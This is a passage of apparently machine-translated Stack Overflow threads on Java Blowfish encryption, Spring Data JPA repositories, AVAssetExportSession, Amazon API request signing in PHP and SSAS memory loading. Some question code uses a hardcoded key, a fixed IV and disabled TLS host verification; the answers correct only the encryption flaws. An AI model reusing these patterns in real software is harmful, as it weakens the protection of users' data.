        String errorMsg = "ERROR: getBytes :" + e;
        return null;
    }
}

public static void encryptOrDecrypt(String key, int mode, InputStream is, OutputStream os) throws Throwable {

   String iv = "12345678";
   byte[] IVBytes = getBytes(iv);
   IvParameterSpec IV = new IvParameterSpec(IVBytes);

    byte[] KeyData = key.getBytes(); 
    SecretKeySpec blowKey = new SecretKeySpec(KeyData, "Blowfish"); 
    //Cipher cipher = Cipher.getInstance("Blowfish/CBC/PKCS5Padding");
    Cipher cipher = Cipher.getInstance("Blowfish/CBC/NoPadding");

    if (mode == Cipher.ENCRYPT_MODE) {
        cipher.init(Cipher.ENCRYPT_MODE, blowKey, IV);
        CipherInputStream cis = new CipherInputStream(is, cipher);
        doCopy(cis, os);
    } else if (mode == Cipher.DECRYPT_MODE) {
        cipher.init(Cipher.DECRYPT_MODE, blowKey, IV);
        CipherOutputStream cos = new CipherOutputStream(os, cipher);
        doCopy(is, cos);
    }
}

public static void doCopy(InputStream is, OutputStream os) throws IOException {
    byte[] bytes = new byte[4096];
    //byte[] bytes = new byte[64];
    int numBytes;
    while ((numBytes = is.read(bytes)) != -1) {
        os.write(bytes, 0, numBytes);
    }
    os.flush();
    os.close();
    is.close();
}   

public static void main(String[] args) {

    //Encrypt the reports
    try {
        String key = "squirrel123";

        FileInputStream fis = new FileInputStream("war_and_peace.txt");
        FileOutputStream fos = new FileOutputStream("encrypted.txt");
        encrypt(key, fis, fos);

        FileInputStream fis2 = new FileInputStream("encrypted.txt");
        FileOutputStream fos2 = new FileOutputStream("decrypted.txt");
        decrypt(key, fis2, fos2);
    } catch (Throwable e) {
        e.printStackTrace();
    }
} 
```

`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-27T16:39:23.750

这里有几件事不是最佳的。

但是，让我们首先解决您的问题。输入的最后一部分以某种方式丢失的原因是您指定的填充：无！如果不指定填充，则`Cipher`可以只对全长块（Blowfish 为 8 个字节）进行操作。长度小于一个块的多余输入将被静默丢弃，并且缺少文本。详细说明：“This is some text”有 17 个字节长，因此将解密两个完整的块，最后的第 17 个字节“t”将被丢弃。

始终将填充与对称分组密码结合使用，PKCS5Padding 很好。

接下来，当使用 进行操作时`Cipher`，您不需要实现自己的`getBytes()`-`String#getBytes`已经为您完成了这项工作。只需确保在获取字节时以及`String`稍后从字节重构时使用相同的字符编码，这是常见的错误来源。

您应该查看[JCE 文档](http://docs.oracle.com/javase/6/docs/technotes/guides/security/crypto/CryptoSpec.html)，它们将帮助您避免一些常见错误。

例如，直接使用字符串密钥对于对称加密来说是不可行的，它们不包含足够的熵，这将使暴力破解这样的密钥变得更容易。JCE 为您提供课程，除非您确切知道自己在做什么，否则您`KeyGenerator`应该*始终使用它。*它会为您生成适当大小的安全随机密钥，但除此之外，人们往往会忘记这一点，它还将确保它不会创建弱密钥。例如，在实际使用中应避免使用已知的 Blowfish 弱密钥。

最后，在进行 CBC 加密时不应使用确定性 IV。最近有一些攻击可以利用这一点，从而完全恢复消息，这显然不是很酷。IV 应始终随机选择（使用 a `SecureRandom`）以使其不可预测。`Cipher`默认情况下会为您执行此操作，您可以在使用`Cipher#getIV`.

另一方面，与安全性相关性较低：您应该关闭`finally`块中的流以确保不惜一切代价关闭它们 - 否则在发生异常时您将留下一个打开的文件句柄。

这是您的代码的更新版本，它考虑了所有这些方面（必须使用字符串而不是 中的文件`main`，但您可以简单地将其替换为您那里的内容）：

```
private static final String ALGORITHM = "Blowfish/CBC/PKCS5Padding";

/* now returns the IV that was used */
private static byte[] encrypt(SecretKey key, 
                              InputStream is, 
                              OutputStream os) {
    try {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        CipherInputStream cis = new CipherInputStream(is, cipher);
        doCopy(cis, os);
        return cipher.getIV();
    } catch (Exception ex) {
        throw new RuntimeException(ex);
    }
}

private static void decrypt(SecretKey key, 
                            byte[] iv, 
                            InputStream is, 
                            OutputStream os) 
{
    try {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
        CipherInputStream cis = new CipherInputStream(is, cipher);
        doCopy(cis, os);
    } catch (Exception ex) {
        throw new RuntimeException(ex);
    }
}

private static void doCopy(InputStream is, OutputStream os) 
throws IOException {
    try {
        byte[] bytes = new byte[4096];
        int numBytes;
        while ((numBytes = is.read(bytes)) != -1) {
            os.write(bytes, 0, numBytes);
        }
    } finally {
        is.close();
        os.close();
    }
}

public static void main(String[] args) {
    try {
        String plain = "I am very secret. Help!";

        KeyGenerator keyGen = KeyGenerator.getInstance("Blowfish");
        SecretKey key = keyGen.generateKey();
        byte[] iv;

        InputStream in = new ByteArrayInputStream(plain.getBytes("UTF-8"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        iv = encrypt(key, in, out);

        in = new ByteArrayInputStream(out.toByteArray());
        out = new ByteArrayOutputStream();
        decrypt(key, iv, in, out);

        String result = new String(out.toByteArray(), "UTF-8");
        System.out.println(result);
        System.out.println(plain.equals(result)); // => true
    } catch (Exception e) {
        e.printStackTrace();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-27T16:53:54.800

你有你的`CipherInputStream`和`CipherOutputStream`混淆了。为了加密，你从一个普通的输入流中读取并写入一个`CipherOutputStream`. 解密......你明白了。

编辑：

发生的情况是您已指定 NOPADDING*并且*您正在尝试使用 CipherInputStream 进行加密。前 16 个字节构成两个有效的完整块，因此被正确加密。然后只剩下 1 个字节，当 CipherInputStream 类收到文件结束指示时，它对`Cipher.doFinal()`密码对象执行 a 并收到 IllegalBlockSizeException。此异常被吞下，并且 read 返回 -1 指示文件结束。但是，如果您使用 PKCS5PADDING 一切都应该工作。

编辑2：

emboss 是正确的，因为真正的问题是使用带有 NOPADDING 选项的 CipherStream 类很棘手且容易出错。事实上，这些类明确声明它们会默默地吞下底层 Cipher 实例抛出的每个安全异常，因此它们对于初学者来说可能不是一个好的选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T09:39:15.117

密钥是二进制的，`String`不是二进制数据的容器。使用字节[]。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-27T09:45:49.547

当我遇到这个问题时，我不得不在密码上调用 doFinal：

[http://docs.oracle.com/javase/1.4.2/docs/api/javax/crypto/Cipher.html#doFinal](http://docs.oracle.com/javase/1.4.2/docs/api/javax/crypto/Cipher.html#doFinal) ()

# spring-data-jpa - Spring Data - JPA，自定义存储库不起作用

> ID：10772984
> 
> 赞同：1
> 
> 时间：2012-05-27T09:35:49.287
> 
> 标签：spring-data-jpa

我想向所有 JPA 存储库添加一个方法，我按照[手册](http://static.springsource.org/spring-data/data-jpa/docs/current/reference/html/#repositories.custom-implementations)创建了以下类：

```
@NoRepositoryBean
interface BillingEntityJPARepository<T, ID extends Serializable> extends JpaRepository<T, ID> {

     /**
      * @return
      */
      public Set<T> findAllWithoutNullableObject(Class<T> clazz);
}

public class BillingEntityJPARepositoryImpl<T, ID extends Serializable> extends SimpleJpaRepository<T, ID> implements BillingEntityJPARepository<T, ID> {

    @PersistenceContext(type = PersistenceContextType.EXTENDED)
    private EntityManager entityManager;

    @Autowired
    private NullObjectsCache nullObjectsCache;

  /**
   * @param domainClass
   * @param em
   */
   public BillingEntityJPARepositoryImpl(Class<T> domainClass, EntityManager em) {
   super(domainClass, em);
   }

   /**
    * {@inheritDoc}
    */
    @Override
    public Set<T> findAllWithoutNullableObject(Class<T> clazz) {
    //...
    }

}

public class BillingEntityJPARepositoryFactoryBean<R extends JpaRepository<T, I>, T, I extends Serializable> extends JpaRepositoryFactoryBean<R, T, I> {

/**
 * {@inheritDoc}
 */
protected RepositoryFactorySupport createRepositoryFactory(EntityManager entityManager) {
    return new BillingEntityJPARepositoryFactory(entityManager);
}

private static class BillingEntityJPARepositoryFactory<T, I extends Serializable> extends JpaRepositoryFactory {

private EntityManager entityManager;

/**
 * @param entityManager
 */
public BillingEntityJPARepositoryFactory(EntityManager entityManager) {
    super(entityManager);
    this.entityManager = entityManager;
}

/**
 * {@inheritDoc}
 */
protected Object getTargetRepository(RepositoryMetadata metadata) {
    return new BillingEntityJPARepositoryImpl<T, I>((Class<T>) metadata.getDomainClass(), entityManager);
}

/**
 * {@inheritDoc}
 */
protected Class<?> getRepositoryBaseClass(RepositoryMetadata metadata) {
    return BillingEntityJPARepository.class;
    }
    }
} 
```

我还修改了存储库配置：

```
<repositories base-package="xx.yy.billing.domain.repository.jpa" entity-manager-factory-ref="entityManagerFactory" factory-class="xx.yy.billing.domain.repository.jpa.BillingEntityJPARepositoryFactoryBean"/> 
```

最后，我使所有存储库接口都扩展了 BillingEntityJPARepository，现在每当我使用任何存储库时，一切正常，除非我调用 BillingEntityJPARepository (findAllWithoutNullableObject) 中定义的方法，它给了我以下异常：

```
Caused by: java.lang.IllegalAccessException: Class org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor can not access a member of class com.colureware.billing.domain.repository.jpa.BillingEntityJPARepository with modifiers "public abstract"
at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:95)
at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:261)
at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:253)
at java.lang.reflect.Method.invoke(Method.java:594)
at org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor.executeMethodOn(RepositoryFactorySupport.java:368)
at org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor.invoke(RepositoryFactorySupport.java:349)
at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:110)
at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:155)
at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
... 61 more 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T11:31:33.850

这是一个愚蠢的错误，我忘记了 BillingEntityJPARepository 声明中的 public 修饰符。

# iphone - 为 AVAssetExportSession 创建时间范围

> ID：10772992
> 
> 赞同：6
> 
> 时间：2012-05-27T09:36:53.407
> 
> 标签：iphone, ios, time, avassetexportsession, cmtime

我想知道如何为`AVAssetExportSession`时间戳创建时间范围，例如：

```
NSTimeInterval start = [[NSDate date] timeIntervalSince1970];
NSTimeInterval end = [[NSDate date] timeIntervalSince1970]; 
```

我用于导出会话的代码如下：

```
AVAssetExportSession *exportSession = [[AVAssetExportSession alloc] initWithAsset:asset presetName:AVAssetExportPresetHighestQuality];

exportSession.outputURL = videoURL;
exportSession.outputFileType = AVFileTypeQuickTimeMovie;
exportSession.timeRange = CMTimeRangeFromTimeToTime(start, end); 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-27T10:46:44.273

`timeRange`in属性`AVAssetExportSession`允许您对资产进行部分导出，指定从哪里开始以及持续时间。如果未指定，它将导出整个视频，换句话说，它将从零开始并导出总时长。

开始和持续时间都应表示为`CMTime`。

例如，如果要导出资产的前半部分：

```
CMTime half = CMTimeMultiplyByFloat64(exportSession.asset.duration, 0.5);
exportSession.timeRange = CMTimeRangeMake(kCMTimeZero, half); 
```

或下半场：

```
exportSession.timeRange = CMTimeRangeMake(half, half); 
```

或最后 10 秒：

```
CMTime _10 = CMTimeMakeWithSeconds(10, 600);
CMTime tMinus10 = CMTimeSubtract(exportSession.asset.duration, _10);
exportSession.timeRange = CMTimeRangeMake(tMinus10, _10); 
```

检查`CMTime`参考以了解计算所需确切时间的其他方法。

# php - Amazon Web Services 签名错误

> ID：10772993
> 
> 赞同：0
> 
> 时间：2012-05-27T09:36:54.423
> 
> 标签：php, curl, amazon-web-services

```
<?php
error_reporting(E_ALL); 
ini_set("display_errors", 1); 
$AWS_ACCESS_KEY_ID = "KEY";
$AWS_SECRET_ACCESS_KEY = "ACCESS KEY";

$base_url = "http://webservices.amazon.com/onca/xml?";
$url_params = array('Operation'=>"ItemSearch",'Service'=>"AWSECommerceService",
 'AWSAccessKeyId'=>$AWS_ACCESS_KEY_ID,'AssociateTag'=>"associateTag",
 'Version'=>"2011-08-01",'Availability'=>"Available",'Condition'=>"All",
 'ItemPage'=>"1",'ResponseGroup'=>"Images,ItemAttributes,EditorialReview",
 'Keywords'=>"Amazon");

// Add the Timestamp
$url_params['Timestamp'] = gmdate("Y-m-d\TH:i:s.\\0\\0\\0\\Z", time());

// Sort the URL parameters
$url_parts = array();
foreach(array_keys($url_params) as $key)
    $url_parts[] = $key."=".$url_params[$key];
sort($url_parts);

// Construct the string to sign
$string_to_sign = "GET\webservices.amazon.com\n/onca/xml?\n".implode("&",$url_parts);
$string_to_sign = str_replace('+','%20',$string_to_sign);
$string_to_sign = str_replace(':','%3A',$string_to_sign);
$string_to_sign = str_replace(';',urlencode(';'),$string_to_sign);

// Sign the request
$signature = hash_hmac("sha256",$string_to_sign,$AWS_SECRET_ACCESS_KEY,TRUE);

// Base64 encode the signature and make it URL safe
$signature = base64_encode($signature);
$signature = str_replace('+','%2B',$signature);
$signature = str_replace('=','%3D',$signature);

$url_string = implode("&",$url_parts);
$url = $base_url.$url_string."&Signature=".$signature;
print $url;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$xml_response = curl_exec($ch);
echo $xml_response; 
    ?> 
```

这将返回签名错误；为什么？

这是输出，密钥和标签被替换以保护隐私

[http://webservices.amazon.com/onca/xml?AWSAccessKeyId=KEY&AssociateTag=ASSIOCATE](http://webservices.amazon.com/onca/xml?AWSAccessKeyId=KEY&AssociateTag=ASSIOCATE) TAG&Availability=Available&Condition=All&ItemPage=1&Keywords=Amazon&Operation=ItemSearch&ResponseGroup=Images,ItemAttributes,EditorialReview&Service=AWSECommerceService&Timestamp=2012-05-27T09:35:43.000Z&Version= 2011-08-01&签名=KEVlbW6G9ygvHheTf5m0ymguE64LEaYGDtQZQe0bCLQ%3D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T20:48:44.583

不确定您是否仍然需要这方面的帮助，但由于没有在您的呼叫中提供有效的关联标签，它很可能会失败。

```
'AssociateTag'=>"associateTag" 
```

因此，您需要将此值更改为：

```
'AssociateTag'=>"(my-assigned-associate-tag)" 
```

您必须使用亚马逊提供给您的关联标签。我认为关联标签通常以数字“20”结尾，但我无法验证。如果您不知道您的关联标签，请在此处登录您的关联帐户： [亚马逊关联页面](https://affiliate-program.amazon.com/)

...它将是页面左上角的“**登录为/跟踪 ID ”值。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T13:07:15.490

签名错误主要是因为access key id和secret key id不匹配

请交叉验证此 ID。

还要检查 associateTag

# ssas - 内存技术 MSBI 中的数据加载时间是多少？

> ID：10772996
> 
> 赞同：0
> 
> 时间：2012-05-27T09:38:02.657
> 
> 标签：ssas, sql-server-2012

我已经读过 sql server 2012 中的列存储和 Vertipaq 在内存存储选项中。所以，它将存储在 RAM 中。我只想知道，它什么时候存储到 RAM？sql server 的启动时间还是当我们从他们那里查询数据时？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T04:05:00.360

SQL Server 列存储不是内存存储选项。它更多的是在磁盘存储选项上优化的内存和访问模式。当查询请求数据时，数据被读入内存（缓冲池）。只要房间不需要其他东西，它就会保持在那里，遵循标准的缓存老化规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T13:52:20.593

对于 SSAS 表格，“模型”将在处理后并在启动 SSAS 表格实例时立即加载到 RAM 中。

对于从客户端工作站运行的 PowerPivot，“模型”将在将数据拉入模型（对于新的 powerpivot 工作簿）或打开文件（对于现有的 powerpivot 工作簿）后立即加载到 RAM 中。

对于发布到 Sharepoint 的 PowerPivot，“模型”将在工作簿发布后立即加载到 RAM 中。Sharepoint 有自己的 PowerPivot 版本的 SSAS 表格实例在后台运行。将新的 PowerPivot 工作簿发布到 SharePoint 时，将从工作簿中提取“模型”并加载到此 PowerPivot 特定的 SSAS 表格实例中。之后，有几个配置选项决定了模型在内存中的保留时间。这是因为 PowerPivot 模型和 SSAS 表格模型之间的访问模式完全不同。Kevin Donavan 在 TechEd2012 North America 期间对此做了很好的介绍（[视频链接](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2012?sort=sequential&direction=desc&term=&s=kevin%2bdonovan)——不记得是哪一个了）